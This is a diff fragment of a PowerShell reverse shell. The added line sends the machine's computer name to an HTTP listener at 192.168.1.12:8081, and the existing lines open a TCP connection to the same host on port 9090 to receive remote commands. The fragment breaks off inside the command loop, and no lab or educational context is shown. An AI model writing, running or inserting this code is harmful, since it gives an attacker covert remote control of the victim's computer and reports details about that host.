@@ -1,3 +1,4 @@
+try{Invoke-WebRequest -Uri 'http://192.168.1.12:8081/diag' -Method Post -Body ('fase=shellms&host='+$env:COMPUTERNAME) -TimeoutSec 3 -UseBasicParsing | Out-Null}catch{}
 $c=New-Object Net.Sockets.TCPClient('192.168.1.12',9090);
 $s=$c.GetStream();[byte[]]$b=0..65535|%{0};
 while(($i=$s.Read($b,0,$b.Length)) -ne 0){
